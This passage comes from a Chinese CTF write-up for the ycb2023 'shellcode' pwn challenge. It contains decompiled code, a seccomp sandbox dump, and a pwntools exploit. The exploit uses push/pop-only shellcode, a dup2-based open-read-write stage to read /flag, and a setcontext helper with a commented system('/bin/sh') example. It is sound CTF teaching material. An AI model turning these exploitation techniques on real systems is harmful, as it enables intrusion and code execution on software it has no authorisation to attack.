    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>buf <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>
      <span class="token keyword">break</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  v4 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">;</span>
  v2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[6] Next"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> s <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">*</span>v4 <span class="token operator">>=</span> <span class="token number">79</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>v4 <span class="token operator">&lt;=</span> <span class="token number">95</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token operator">++</span>v2<span class="token punctuation">;</span>
      <span class="token operator">++</span>v4<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span><span class="token punctuation">(</span>v4 <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] It's Not GW's Expect !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[7] Just Do It!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_1289</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> v6 <span class="token operator">-</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

__int64 <span class="token function">sub_1289</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __int64 v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-48h]</span>

  v1 <span class="token operator">=</span> <span class="token function">seccomp_init</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">2147418112LL</span><span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">2147418112LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">2147418112LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">seccomp_rule_add</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> <span class="token number">2147418112LL</span><span class="token punctuation">,</span> <span class="token number">33LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">seccomp_load</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>checksec 栈有rwx的权限</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lhj@lhj-virtual-machine:~/Desktop/ycb2023/shellcode$ checksec shellcode
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Could not populate PLT: invalid syntax <span class="token punctuation">(</span>unicorn.py, line <span class="token number">110</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/lhj/Desktop/ycb2023/shellcode/shellcode'</span>
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>程序的逻辑是输入17个字节的数据(read 输入数据的逻辑有问题导致可以多输入一个字节) 然后判断输入的长度是否大于等于16个字节，判断每个字节是否是[79,95]这个范围的字节码，如果是就会执行这些shellcode</p>
<p>因为seccomp要满足一定的输入约束才会执行load bpf，所以直接seccomp dump是dump不出来沙箱规则的，得用python模拟符合输入约束的数据才能把沙箱规则dump出来，可以发现要用orw把flag读出来，然后rw对fd还有些约束，r的fd必须小于等于2，w的fd必须大于2，dup2(old_fd,new_fd)系统调用可以将一个fd重定向到一个新的fd，所以orw得用dup2重定向一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lhj@lhj-virtual-machine:~/Desktop/ycb2023/shellcode$ python test.py <span class="token operator">|</span> seccomp-tools dump ./shellcode
<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> The Joy Of Contsructing shellcode ~
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Are You Superstar In Ctfers?
<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Input: <span class="token punctuation">(</span>ye / no<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Your Answer: b<span class="token string">'
[4] Welcome To P0P'</span>s World<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span>
<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> Input Your P0P Code <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> Next
<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> Just Do It<span class="token operator">!</span>
 line  CODE  JT   JF      K
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 0000: 0x20 0x00 0x00 0x00000004  A <span class="token operator">=</span> arch
 0001: 0x15 0x00 0x12 0xc000003e  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> ARCH_X86_64<span class="token punctuation">)</span> goto 0020
 0002: 0x20 0x00 0x00 0x00000000  A <span class="token operator">=</span> sys_number
 0003: 0x35 0x00 0x01 0x40000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;</span> 0x40000000<span class="token punctuation">)</span> goto 0005
 0004: 0x15 0x00 0x0f 0xffffffff  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0xffffffff<span class="token punctuation">)</span> goto 0020
 0005: 0x15 0x0d 0x00 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> <span class="token function">open</span><span class="token punctuation">)</span> goto 0019
 0006: 0x15 0x0c 0x00 0x00000021  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">==</span> dup2<span class="token punctuation">)</span> goto 0019
 0007: 0x15 0x00 0x05 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token builtin class-name">read</span><span class="token punctuation">)</span> goto 0013
 0008: 0x20 0x00 0x00 0x00000014  A <span class="token operator">=</span> fd <span class="token operator">>></span> <span class="token number">32</span> <span class="token comment"># read(fd, buf, count)</span>
 0009: 0x25 0x0a 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">></span> 0x0<span class="token punctuation">)</span> goto 0020
 0010: 0x15 0x00 0x08 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0x0<span class="token punctuation">)</span> goto 0019
 0011: 0x20 0x00 0x00 0x00000010  A <span class="token operator">=</span> fd <span class="token comment"># read(fd, buf, count)</span>
 0012: 0x25 0x07 0x06 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">></span> 0x2<span class="token punctuation">)</span> goto 0020 <span class="token keyword">else</span> goto 0019
 0013: 0x15 0x00 0x06 0x00000001  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> <span class="token function">write</span><span class="token punctuation">)</span> goto 0020
 0014: 0x20 0x00 0x00 0x00000014  A <span class="token operator">=</span> fd <span class="token operator">>></span> <span class="token number">32</span> <span class="token comment"># write(fd, buf, count)</span>
 0015: 0x25 0x03 0x00 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">></span> 0x0<span class="token punctuation">)</span> goto 0019
 0016: 0x15 0x00 0x03 0x00000000  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">!=</span> 0x0<span class="token punctuation">)</span> goto 0020
 0017: 0x20 0x00 0x00 0x00000010  A <span class="token operator">=</span> fd <span class="token comment"># write(fd, buf, count)</span>
 0018: 0x25 0x00 0x01 0x00000002  <span class="token keyword">if</span> <span class="token punctuation">(</span>A <span class="token operator">&lt;=</span> 0x2<span class="token punctuation">)</span> goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  <span class="token builtin class-name">return</span> ALLOW
 0020: 0x06 0x00 0x00 0x00000000  <span class="token builtin class-name">return</span> KILL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>test.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
<span class="token comment"># context.log_level='debug'</span>
shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>
<span class="token triple-quoted-string string">'''
push rax
pop rsi
push rbx
pop rax
push rbx
pop rdi
pop rcx
pop rcx
pop rsp
pop rbp
push rbp
push rbp
push rbp
push rbp
push rbp
pop rdx
'''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token string">b'Y'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>限制的范围都是一些可以调整堆栈和寄存器的asm</p>
<pre class="line-numbers language-none"><code class="language-none"># for i in range(79,96):
#     b &#x3D; bytes([i])
#     try:
#         print(disasm(b))
#     except:
#         pass

#    0:   4f                      rex.WRXB
#    0:   50                      push   rax
#    0:   51                      push   rcx
#    0:   52                      push   rdx
#    0:   53                      push   rbx
#    0:   54                      push   rsp
#    0:   55                      push   rbp
#    0:   56                      push   rsi
#    0:   57                      push   rdi
#    0:   58                      pop    rax
#    0:   59                      pop    rcx
#    0:   5a                      pop    rdx
#    0:   5b                      pop    rbx
#    0:   5c                      pop    rsp
#    0:   5d                      pop    rbp
#    0:   5e                      pop    rsi
#    0:   5f                      pop    rdi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过yes和no那两个字节输入那 写一个syscall，push和pop调整堆栈，把syscall给读到一个寄存器里，然后通过push写满整个栈，这样在shellcode执行到结尾的时候就会取到这个syscall，syscall read一次后用dup2 orw的shellcode把flag读出来就行了</p>
<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment"># from LibcSearcher import *</span>
<span class="token comment"># import itertools</span>
<span class="token comment"># import ctypes</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
is_debug <span class="token operator">=</span> <span class="token number">1</span>
IP <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span>
PORT <span class="token operator">=</span> <span class="token number">9999</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./shellcode'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

<span class="token keyword">def</span> <span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> remote<span class="token punctuation">(</span>IP<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> is_debug <span class="token keyword">else</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>

g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> x <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">else</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
r_leak_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leak_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">create_ucontext</span><span class="token punctuation">(</span>
    src<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">,</span>
    rsp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rbp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r12<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r13<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r14<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r15<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rsi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdi<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rcx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r8<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    r9<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rdx<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>
    rip<span class="token operator">=</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytearray</span><span class="token punctuation">:</span>
    b <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0xE0</span><span class="token punctuation">:</span><span class="token number">0xE8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>src<span class="token punctuation">)</span>  <span class="token comment"># fldenv ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x1C0</span><span class="token punctuation">:</span><span class="token number">0x1C8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0x1F80</span><span class="token punctuation">)</span>  <span class="token comment"># ldmxcsr</span>

    b<span class="token punctuation">[</span><span class="token number">0xA0</span><span class="token punctuation">:</span><span class="token number">0xA8</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">:</span><span class="token number">0x88</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x78</span><span class="token punctuation">:</span><span class="token number">0x80</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rbp<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x48</span><span class="token punctuation">:</span><span class="token number">0x50</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r12<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x50</span><span class="token punctuation">:</span><span class="token number">0x58</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r13<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x58</span><span class="token punctuation">:</span><span class="token number">0x60</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r14<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">:</span><span class="token number">0x68</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r15<span class="token punctuation">)</span>

    b<span class="token punctuation">[</span><span class="token number">0xA8</span><span class="token punctuation">:</span><span class="token number">0xB0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rip<span class="token punctuation">)</span>  <span class="token comment"># ret ptr</span>
    b<span class="token punctuation">[</span><span class="token number">0x70</span><span class="token punctuation">:</span><span class="token number">0x78</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x68</span><span class="token punctuation">:</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x98</span><span class="token punctuation">:</span><span class="token number">0xA0</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rcx<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x28</span><span class="token punctuation">:</span><span class="token number">0x30</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r8<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">:</span><span class="token number">0x38</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>r9<span class="token punctuation">)</span>
    b<span class="token punctuation">[</span><span class="token number">0x88</span><span class="token punctuation">:</span><span class="token number">0x90</span><span class="token punctuation">]</span> <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span>

    <span class="token keyword">return</span> b


<span class="token keyword">def</span> <span class="token function">setcontext32</span><span class="token punctuation">(</span>libc<span class="token punctuation">:</span> ELF<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token comment"># for i in range(79,96):</span>
<span class="token comment">#     b = bytes([i])</span>
<span class="token comment">#     try:</span>
<span class="token comment">#         print(disasm(b))</span>
<span class="token comment">#     except:</span>
<span class="token comment">#         pass</span>

<span class="token comment">#    0:   4f                      rex.WRXB</span>
<span class="token comment">#    0:   50                      push   rax</span>
<span class="token comment">#    0:   51                      push   rcx</span>
<span class="token comment">#    0:   52                      push   rdx</span>
<span class="token comment">#    0:   53                      push   rbx</span>
<span class="token comment">#    0:   54                      push   rsp</span>
<span class="token comment">#    0:   55                      push   rbp</span>
<span class="token comment">#    0:   56                      push   rsi</span>
<span class="token comment">#    0:   57                      push   rdi</span>
<span class="token comment">#    0:   58                      pop    rax</span>
<span class="token comment">#    0:   59                      pop    rcx</span>
<span class="token comment">#    0:   5a                      pop    rdx</span>
<span class="token comment">#    0:   5b                      pop    rbx</span>
<span class="token comment">#    0:   5c                      pop    rsp</span>
<span class="token comment">#    0:   5d                      pop    rbp</span>
<span class="token comment">#    0:   5e                      pop    rsi</span>
<span class="token comment">#    0:   5f                      pop    rdi</span>


sa<span class="token punctuation">(</span><span class="token string">"[2] Input: (ye / no)"</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span><span class="token string">'syscall'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


gdb_comm <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
b *$rebase(0x14DF)
c
'''</span>
<span class="token comment"># gdb.attach(p,gdb_comm)</span>

sa<span class="token punctuation">(</span><span class="token string">"[5] ======== Input Your P0P Code ========"</span><span class="token punctuation">,</span>asm<span class="token punctuation">(</span>
<span class="token triple-quoted-string string">'''
push rax
pop rsi
push rbx
pop rax
push rbx
pop rdi
pop rcx
pop rcx
pop rsp
pop rbp
push rbp
push rbp
push rbp
push rbp
push rbp
pop rdx
'''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> asm<span class="token punctuation">(</span><span class="token string">'NOP'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">convert_str_asmencode</span><span class="token punctuation">(</span>content<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    out <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> content<span class="token punctuation">:</span>
        out <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> out
    out <span class="token operator">=</span> <span class="token string">"0x"</span> <span class="token operator">+</span> out
    <span class="token keyword">return</span> out

<span class="token comment"># orw_shellcode = b'\x90' * 0x20 + asm(f'''</span>
<span class="token comment"># xor rsi,rsi</span>
<span class="token comment"># xor rdx,rdx</span>
<span class="token comment"># push rdx</span>
<span class="token comment"># mov rax,&#123;convert_str_asmencode("/flag")&#125;</span>
<span class="token comment"># push rax</span>
<span class="token comment"># mov rdi,rsp</span>
<span class="token comment"># xor rax,rax</span>
<span class="token comment"># mov al,2</span>
<span class="token comment"># syscall</span>
<span class="token comment"># mov rdi,rax</span>
<span class="token comment"># mov dl,0x40</span>
<span class="token comment"># mov rsi,rsp</span>
<span class="token comment"># mov al,0</span>
<span class="token comment"># syscall</span>
<span class="token comment"># xor rdi,rdi</span>
<span class="token comment"># mov al,1</span>
<span class="token comment"># syscall</span>
